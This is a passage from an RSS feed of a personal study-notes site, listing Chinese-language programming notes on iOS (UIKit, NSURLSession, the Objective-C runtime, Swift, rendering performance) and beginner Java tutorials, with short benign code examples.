View # 接下来是 View，在 iOS 中，View 一般是 UIKit 中 UIView 及其子类的一些实例，是用户可以看得见的对象。比如说 UIView，是用于界面元素展示的类的基类，以及 UIButton、UILabel、UISlider、UITextField 等等。
ViewController # Objective-C 一般是 ViewController 一般是 UIViewController 及其子类的实例，系统提供给我们的比较常用的 ViewController 有以下的这些：
UIViewController：用来展示多个视图控制器； UITabBarController：在 UIViewController 的特性之上，加入可以在这些控制器之间进行切换； UINavigationController：在 UIViewController 的特性之上，在视图控制器间进行导航控制； UITableViewController：展示一个单列的表的视图控制器； UICollectionViewController：以及展示集合视图的； UIAlertViewController：展示弹框消息。 在项目中，ViewController 可以通过持有的方式直接与 View 与 Model 进行通信。</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/9.%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%AD%98%E5%82%A8/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/9.%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%AD%98%E5%82%A8/</guid><description>网络 # 基础知识 # 两种数据交换格式：XML、JSON（JavaScript Object Notation） 调试器： https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx https://www.xiongdianpku.com/api/bytedance/image/list https://www.charlesproxy.com/ 处理 HTTP/HTTPS 请求 # NSURLSession # 什么是 NSURLSession？
本身是一个类，同时也代指一套用于处理 HTTP/HTTPS 请求的类。 关于类 NSURLSession：
负责管理发送和接收 HTTP 请求； 通过获取单例或传入 NSURLSessionConfiguration 创建实例； 可以通过 Block 或 delegate 接收回调； 主要有以下三种方法创建获取一个 session：
+ (NSURLSession *)sharedSession; // 使用全局的 Cache、Cookie、证书，获取一个共享的会话。 + (NSURLSession *)sessionWithConfiguration:(NSURLSessionConfiguration *)configuration; // 通过传入一个 NSURLSessioinConfiguration（用于设置相关的参数）配置来创建相关会话。 + (NSURLSession *)sessionWithConfiguration:(NSURLSessionConfiguration *)configuration delegate:(id &amp;lt;NSURLSessionDelegate&amp;gt;)delegate delegateQueue:(NSOperationQueue *)queue; // 根据 NSURLSessionConfiguration、NSURLSessionDelegate、NSOperationQueue 三个参数创建会话。 NSURLSessionConfiguration # 上面创建方法中已经提及了这个类，它有三种类型的配置：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/1.%E7%AE%80%E4%BB%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/1.%E7%AE%80%E4%BB%8B/</guid><description>参考资料：
https://halfrost.com/objc_runtime_isa_class/ https://en.wikipedia.org/wiki/Runtime_library 简介 # 什么是 Runtime # Runtime 顾名思义是运行时的意思，也就是指程序运行的时候。
对于动态语言来说，通常会有很多需要运行时才可以确定的特性，比如：Objective-C 中的消息转发机制、Python 中的变量类型机制等。实现这些动态功能的函数通常被封装成一个库，称作为运行时库。
这里要讲的 Objective-C 的 Runtime 就是 OC 的运行时库。
Objective-C 的 Runtime # Objective-C 有一些动态特性需要运行时库来完成：
类的方法调用、消息转发是间接的：传统的函数一般在编译时就已经把参数信息和函数实现打包到编译后的源码中了；在 OC 中，调用一个实例的方法，所做的是向该实例的指针发送消息，实例在收到消息后，从自身的实现中寻找响应这条消息的方法。
类是动态创建的：持有方法、方法实现、协议等，都是在创建的时候绑定在对象上的；
简单的可以简化成 Runtime 管理的都是 id（id 的本质其实是 objc_object, objc_class 头部其实就是 id, 也就是isa）。
Objective-C 的编译运行结构大致如下：
+--------------------------------------+ | objective-C source code | | +-------------------+-------------+ | | Framework&amp;amp;Service | Runtime API | +----+-------------------+-------------+ | compiler | +--------------------------------------+ | Runtime System Library | +--------------------------------------+ Objective-C 的代码与 Runtime 的交互发生在以下的三个情况下：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/2.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/2.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</guid><description>参考：
https://halfrost.com/objc_runtime_isa_class/ http://www.cocoawithlove.com/2010/01/what-is-meta-class-in-objective-c.html https://draveness.me/method-struct NSObject # NSObject 协议中定义的多种方法，是 OC 代码与 Runtime 发生交互的重要位置。
NSObject 基类 # 这个类与 NSObject 协议定义在了一个文件 Public Headers/NSObjects.h 中：
OBJC_ROOT_CLASS OBJC_EXPORT @interface NSObject &amp;lt;NSObject&amp;gt; { Class isa OBJC_ISA_AVAILABILITY; } 其中：
OBJC_ROOT_CLASS 是一个宏：
#if !defined(OBJC_ROOT_CLASS) # if __has_attribute(objc_root_class) # define OBJC_ROOT_CLASS __attribute__((objc_root_class)) # else # define OBJC_ROOT_CLASS # endif #endif 它为 NSObject 这个类附加了 objc_root_class 这个属性，这是 GNU C 的特性，见：Attribute
OBJC_EXPORT 也是一个宏，它标记了这个类可以被任意外部位置访问到；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/3.%E7%BC%96%E8%AF%91%E7%BB%93%E6%9E%9C/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/3.%E7%BC%96%E8%AF%91%E7%BB%93%E6%9E%9C/</guid><description>参考资料：
深入剖析-iOS-编译-Clang&amp;mdash;LLVM https://kingcos.me/posts/2019/objects_in_obj-c/ 编译结果 # clang # 我们都知道 Objective-C 是 C++ 的超集。Objetive-C 的代码在编译阶段，先会 clang 被编译为 C++ 代码，然后在 Runtime 上运行。
利用 clang 在命令行里编译 Objective-C 的命令：
# ARC $ clang -fobjc-arc -framework Foundation main.m -o main # MRC $ clang -fno-objc-arc -framework Foundation main.m -o main 我们使用下面的示例程序，来查看 clang 的编译结果：
#import &amp;lt;Foundation/Foundation.h&amp;gt; @interface SheslClass : NSObject { NSNumber *sheslVarNumber; } @property (nonatomic, copy) NSString *sheslPropertyString; + (void)sheslClassMethod; - (NSNumber *)getSheslVarNumber; @end @implementation SheslClass + (void)sheslClassMethod { NSLog(@&amp;#34;Hello World&amp;#34;); } - (NSNumber *)getSheslVarNumber { return sheslVarNumber; } @end int main(int argc, char * argv[]) { [SheslClass sheslClassMethod]; SheslClass *sheslClass = [[SheslClass alloc] init]; return 0; } 我们可以手动将 Objetive-C 代码编译为 C++ 代码：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/swizzling/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/swizzling/</guid><description>Method Swizzling #</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/1.%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</guid><description>基本语法 # 符号概念 # 引入 # Swift 中的引入关键字是 import。
值得注意的是，这个语句可以用来引入任何 Objective-C/C 的库到 Swift 程序中来。
分号 # Swift 不要求在每行语句的结尾使用分号。
但当你在同一行书写多条语句时，必须用分号隔开。
空格 # Swift 并不是像 C/C++，Java 那样完全忽视空格，Swift 对空格的使用有一定的要求，但是又不像 Python 对缩进的要求那么严格。
在 Swift 中，运算符不能直接跟在变量或常量的后面。例如下面的代码会报错：
/// error: prefix/postfix &amp;#39;=&amp;#39; is reserved let a= 1 + 2 /// error: consecutive statements on a line must be separated by &amp;#39;;&amp;#39; let a = 1+ 2 第二个报错比较奇怪，这是因为Swift认为到1+这个语句就结束了，2就是下一个语句了。只有这样写才不会报错：
let a = 1 + 2; // 编码规范推荐使用这种写法 let b = 3+4 // 这样也是OK的 数据类型 # 数据类型基础 # 内置数据类型：语言中内置了以下的几种数据类型：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/2.%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/2.%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B/</guid><description>内置类型 # 字符串 # Swift 字符串是一系列字符的集合。例如 &amp;ldquo;Hello, World!&amp;rdquo; 这样的有序的字符类型的值的集合，它的数据类型为 String。
字符串内嵌变量：
import Cocoa var varA = 20 let constA = 100 var varC:Float = 20.0 var stringA = &amp;#34;\(varA)乘于 \(constA)等于 \(varC * 100)&amp;#34; 字符串判空：String.isEmpty：
字符串连接：+
字符串长度：Swift2: String.count; Swift3: String.characters.count
字符串比较：==
字符串分割（python 中的 split）：
let fullName = &amp;#34;First Last&amp;#34; let fullNameArr = fullName.characters.split{$0 == &amp;#34; &amp;#34;}.map(String.init) 字符 # 数据类型为 Character。
遍历字符串中的字符：
// swift 3 for ch in &amp;#34;Runoob&amp;#34;.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/3.%E5%87%BD%E6%95%B0%E4%B8%8E%E7%BB%93%E6%9E%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/3.%E5%87%BD%E6%95%B0%E4%B8%8E%E7%BB%93%E6%9E%84/</guid><description>函数与结构 # 函数 # Swift 使用一个统一的语法来表示简单的 C 语言风格的函数到复杂的 Objective-C 语言风格的方法。
函数定义：func
func runoob(site: String) -&amp;gt; String { return (site) } 函数调用：
print(runoob(site: &amp;#34;www.runoob.com&amp;#34;)) 函数参数：
参数被包含在函数的括号之中，以逗号分隔。 函数参数都有一个外部参数名（外部调用时指定）和一个局部参数名（内部使用时使用），比如： func test(firstArg a: Int, secondArg b: Int) -&amp;gt; Int { var res = a print(b) return a; } test(firstArg:5, secondArg:3) 使用 inout 关键字定义，使用 &amp;amp; 调用，可以传递引用参数。如果缺少 &amp;amp; 会报错类型不符，如果缺少 inout 会报错将 var 赋值给 let。例子： func swapTwoInts(_ a: inout Int, _ b: inout Int) { let temporaryA = a a = b b = temporaryA } swapTwoInts(&amp;amp;x, &amp;amp;y) 返回元组：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/swiftsdk/%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/</guid><description>问题记录 # 可选项遵照 LogicValue 协议，因此可以出现在布尔环境中。在这种情况下，如果可选类型 T? 包含类型为 T 的任何值（也就是说它的值是 Optional.Some(T) ），这个可选类型等于 true，反之为 false； 没看出来 ! 声明与 ? 声明的区别； 创建数组的两种方式的差异； 字典的底层实现；</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/cpugpu/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/cpugpu/</guid><description>参考：
https://juejin.im/post/5ace078cf265da23994ee493#heading-2 https://www.zhihu.com/question/29163054 https://www.jianshu.com/p/f62e81b72bba CPU &amp;amp; GPU # 图形学概念 # 光栅化（Rasterize / Rasteriztion）：
就是把矢量图形转化成像素点儿的过程。 着色器（Shader），通常着色器分两种：
顶点着色器（vertex shader）：这个是告诉电脑如何打线稿的——如何处理顶点、法线等的数据的小程序。 片面着色器（fragment shader）：这个是告诉电脑如何上色的——如何处理光、阴影、遮挡、环境等等对物体表面的影响，最终生成一副图像的小程序。 二者功能 # CPU 的职能：
加载资源，对象创建，对象调整，对象销毁，布局计算，Autolayout，文本计算，文本渲染； 图片的解码， 图像的绘制（Core Graphics）都是在CPU上面进行的。 GPU 的特点：
GPU 是一个专门为图形高并发计算而量身定做的处理单元，比 CPU 使用更少的电来完成工作并且 GPU 的浮点计算能力要超出 CPU 很多。 GPU 的渲染性能要比 CPU 高效很多，同时对系统的负载和消耗也更低一些，所以在开发中，我们应该尽量让 CPU 负责主线程的 UI 调动，把图形显示相关的工作交给 GPU 来处理，当涉及到光栅化等一些工作时，CPU也会参与进来，这点在后面再详细描述。 GPU 的指责：
接收提交的纹理（Texture）和顶点描述（三角形），应用变换（transform）、混合（合成）并渲染，然后输出到屏幕上。通常你所能看到的内容，主要也就是纹理（图片）和形状（三角模拟的矢量图形）两类。 离屏渲染 # GPU 屏幕渲染有以下两种方式：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96/%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/</guid><description>参考：
https://github.com/ming1016/study/wiki/iOS性能优化 https://juejin.im/post/5ace078cf265da23994ee493#heading-7 优化方案 # UITableView # 缓存池存储 cell，复用 cell：
在 cellForRowAtIndexPath: 回调的时候只创建实例，快速返回 cell，不绑定数据。 在 willDisplayCell: forRowAtIndexPath: 的时候通过 dequeueReusableCellWithIdentifier: 方法取缓存的 cell，通过 initWithStyle:reuseIdentifier: 绑定数据（赋值）。 缓存高度：
在 tableView 滑动时，会不断调用 heightForRowAtIndexPath:，当 cell 高度需要自适应时，每次回调都要计算高度，会导致 UI 卡顿。为了避免重复无意义的计算，需要缓存高度。 通过 Dictionary 或 NSCache 的方式进行缓存； 开源项目：FDTemplateLayoutCell 视图层级优化 # 不要动态创建视图：
在内存可控的前提下，缓存 subview；善用hidden。 减少视图层级：
减少 subview 的数量，使用layer 中的 drawrect 绘制，这样可以利用 GPU 离屏渲染； 少用 clearColor，maskToBounds，阴影效果等，可以避免 GPU 离屏渲染； 图片优化：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/1.introduction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/1.introduction/</guid><description>Introduction # Here is a Hello World code:
// FirstClass.java public class FirstClass { public static void main(String[] args) { System.out.println(&amp;#34;shesl-meow&amp;#34;); } } Compile with the following command:
$ javac FirstClass.java # Generate FirstClass.class in the same folder Run the java program with the following command:
$ java FirstClass Data Type # The first data type we will use is int. int is short for integer, which are all positive and negative numbers, including zero.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/2.conditionalandcontrolflow/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/2.conditionalandcontrolflow/</guid><description>Conditional And Control Flow # Boolean operators # There are three Boolean operators that we will explore. Let&amp;rsquo;s start with the first one: and.
The and operator is represented in Java by &amp;amp;&amp;amp;. It returns a boolean value of true only when the expressions on both sides of &amp;amp;&amp;amp; are true. Great! The second Boolean operator that we will explore is called or.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/3.objectoriented/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/3.objectoriented/</guid><description>Object Oriented # Java is an object-oriented programming (OOP) language, which means that we can design classes, objects, and methods that can perform certain actions. These behaviors are important in the construction of larger, more powerful Java programs.
Classes # Syntax # One fundamental concept of object-oriented programming in Java is the class.
A class is a set of instructions that describe how a data structure should behave.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/4.datastructures/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/codeacademy/4.datastructures/</guid><description>Data Structures # For Loop # The for loop repeatedly runs a block of code until a specified condition is met.
The example below shows how a for loop is used:
for (int counter = 0; counter &amp;lt; 5; counter++) { System.out.println(&amp;#34;The counter value is: &amp;#34; + counter); } The statements within the parentheses of for loop compose the following parts:
Initialization: the int variable named counter is initialized to the value of 0before the loop is run.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/1.%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/1.%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</guid><description>基础语法 # 基本语法 # 编写Java程序时，应注意以下几点：
大小写敏感：Java是大小写敏感的，这就意味着标识符Hello与hello是不同的。 类名：对于所有的类来说，类名的首字母应该大写。如果类名由若干单词组成，那么每个单词的首字母应该大写，例如 MyFirstJavaClass 。 方法名：所有的方法名都应该以小写字母开头。如果方法名含有若干单词，则后面的每个单词首字母大写。 源文件名：源文件名必须和类名相同。当保存文件的时候，你应该使用类名作为文件名保存（切记Java是大小写敏感的），文件名的后缀为.java。（如果文件名和类名不相同则会导致编译错误）。 主方法入口：所有的Java 程序由**public static void main(String []args)**方法开始执行。 Java标识符 # Java所有的组成部分都需要名字。类名、变量名以及方法名都被称为标识符。
关于Java标识符，有以下几点需要注意：
所有的标识符都应该以字母（A-Z或者a-z）,美元符（$）、或者下划线（_）开始 首字符之后可以是字母（A-Z或者a-z）,美元符（$）、下划线（_）或数字的任何字符组合 关键字不能用作标识符 标识符是大小写敏感的 Java修饰符 # 像其他语言一样，Java可以使用修饰符来修饰类中方法和属性。主要有两类修饰符：
访问控制修饰符 : default, public , protected, private 非访问控制修饰符 : final, abstract, static, synchronized 在后面的章节中我们会深入讨论Java修饰符。
Java变量 # Java中主要有如下几种类型的变量
局部变量 类变量（静态变量） 成员变量（非静态变量） Java枚举 # Java 5.0引入了枚举，枚举限制变量只能是预先设定好的值。使用枚举可以减少代码中的bug。
例如，我们为果汁店设计一个程序，它将限制果汁为小杯、中杯、大杯。这就意味着它不允许顾客点除了这三种尺寸外的果汁。
class FreshJuice { enum FreshJuiceSize{ SMALL, MEDIUM , LARGE }; FreshJuiceSize size; } public class FreshJuiceTest { public static void main(String []args){ FreshJuice juice = new FreshJuice(); juice.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/10.character%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/10.character%E7%B1%BB/</guid><description>Character 类 # 例如，将一个char类型的参数传递给需要一个Character类型参数的方法时，那么编译器会自动地将char类型参数转换为Character对象。 这种特征称为装箱，反过来称为拆箱。
// 原始字符 &amp;#39;a&amp;#39; 装箱到 Character 对象 ch 中 Character ch = &amp;#39;a&amp;#39;; // 原始字符 &amp;#39;x&amp;#39; 用 test 方法装箱 // 返回拆箱的值到 &amp;#39;c&amp;#39; char c = test(&amp;#39;x&amp;#39;); 下面是Character类的方法：http://www.runoob.com/java/java-character.html</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/11.string%E7%B1%BB/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/11.string%E7%B1%BB/</guid><description>String 类 # 创建字符串 # String 类有 11 种构造方法，这些方法提供不同的参数来初始化字符串，创建字符串最简单的方式如下：
String greeting = &amp;#34;菜鸟教程&amp;#34;; **注意:**String 类是不可改变的，所以你一旦创建了 String 对象，那它的值就无法改变了（详看笔记部分解析）。
如果需要对字符串做很多修改，那么应该选择使用 StringBuffer &amp;amp; StringBuilder 类。
字符串长度 # String 类的一个访问器方法是 length() 方法，它返回字符串对象包含的字符数。
一个示例代码如下：
public class StringDemo { public static void main(String args[]) { String site = &amp;#34;www.runoob.com&amp;#34;; int len = site.length(); System.out.println( &amp;#34;菜鸟教程网址长度 : &amp;#34; + len ); } } 连接字符串 # String 类提供了连接两个字符串的方法：
string1.concat(string2);</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/12.buffer%E4%B8%8Ebuilder/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/12.buffer%E4%B8%8Ebuilder/</guid><description>StringBuffer 和 StringBuilder 类 # 基本介绍 # 当对字符串进行修改的时候，需要使用 StringBuffer 和 StringBuilder 类。
和 String 类不同的是，StringBuffer 和 StringBuilder 类的对象能够被多次的修改，并且不产生新的未使用对象。
StringBuilder 类在 Java 5 中被提出，它和 StringBuffer 之间的最大不同在于 StringBuilder 的方法不是线程安全的（不能同步访问）。
由于 StringBuilder 相较于 StringBuffer 有速度优势，所以多数情况下建议使用 StringBuilder 类。然而在应用程序要求线程安全的情况下，则必须使用 StringBuffer 类。
使用示例：
public class Test{ public static void main(String args[]){ StringBuffer sBuffer = new StringBuffer(&amp;#34;菜鸟教程官网：&amp;#34;); sBuffer.append(&amp;#34;www&amp;#34;); sBuffer.append(&amp;#34;.runoob&amp;#34;); sBuffer.append(&amp;#34;.com&amp;#34;); System.out.println(sBuffer); } } 方法：http://www.runoob.com/java/java-stringbuffer.html
深入理解 # https://zhuanlan.</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/13.%E6%95%B0%E7%BB%84/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/13.%E6%95%B0%E7%BB%84/</guid><description>数组 # 声明数组变量 # 首先必须声明数组变量，才能在程序中使用数组。下面是声明数组变量的语法：
dataType[] arrayRefVar; // 首选的方法 或 dataType arrayRefVar[]; // 效果相同，但不是首选方法 注意: 建议使用 dataType[] arrayRefVar 的声明风格声明数组变量。 dataType arrayRefVar[] 风格是来自 C/C++ 语言 ，在 Java 中采用是为了让 C/C++ 程序员能够快速理解 Java 语言。
创建数组 # Java 语言使用 new 操作符来创建数组，语法如下：
arrayRefVar = new dataType[arraySize]; 上面的语法语句做了两件事：
使用 dataType[arraySize] 创建了一个数组。
把新创建的数组的引用赋值给变量 arrayRefVar。
数组变量的声明，和创建数组可以用一条语句完成，如下所示：
dataType[] arrayRefVar = new dataType[arraySize]; 另外，你还可以使用如下的方式创建数组：
dataType[] arrayRefVar = {value0, value1, .</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/14.%E6%97%A5%E6%9C%9F%E5%92%8C%E6%97%B6%E9%97%B4/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/14.%E6%97%A5%E6%9C%9F%E5%92%8C%E6%97%B6%E9%97%B4/</guid><description>日期和时间 # Date # java.util 包提供了 Date 类来封装当前的日期和时间。 Date 类提供两个构造函数来实例化 Date 对象。
第一个构造函数使用当前日期和时间来初始化对象。
Date(); 第二个构造函数接收一个参数，该参数是从1970年1月1日起的毫秒数。
Date(long millisec); Date 对象创建以后，可以调用下面的方法：http://www.runoob.com/java/java-date-time.html
获取当前日期时间 # Java 中获取当前日期和时间很简单，使用 Date 对象的 toString() 方法来打印当前日期和时间：
import java.util.Date; public class DateDemo { public static void main(String args[]) { // 初始化 Date 对象 Date date = new Date(); // 使用 toString() 函数显示日期时间 System.out.println(date.toString()); } } 日期比较 # Java 使用以下三种方法来比较两个日期：</description></item><item><title/><link>http://shesl-meow.github.io/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/java/%E8%8F%9C%E9%B8%9F%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/15.%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/</link><pubDate>Mon, 01 Jan 0001 00:00:00 